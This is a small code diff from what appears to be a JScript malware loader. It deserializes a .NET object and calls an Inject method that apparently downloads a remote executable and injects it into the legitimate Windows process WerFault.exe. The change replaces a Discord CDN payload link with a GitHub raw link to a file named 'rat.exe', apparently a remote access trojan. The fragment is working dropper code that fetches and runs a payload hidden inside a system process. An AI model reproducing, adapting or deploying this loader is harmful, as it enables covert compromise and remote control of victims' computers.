@@ -190,7 +190,7 @@ try {
         var d = fmt.Deserialize_2(stm);
         al.Add(undefined);
         var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
-	o.Inject("https://cdn.discordapp.com/attachments/1431030463593709758/1493992953151230143/BarracudaXDriver2020.exe?ex=69e8e5dd&is=69e7945d&hm=9edd4185fd1d58a22d2039cdaf1f19283a670a585a3295be35dc2f7ae75794a7&", "C:\\Windows\\System32\\WerFault.exe");
+	o.Inject("https://github.com/Boboalover/ratanaman/raw/refs/heads/main/rat.exe", "C:\\Windows\\System32\\WerFault.exe");
 
 } catch (e) {
     debug(e.message);
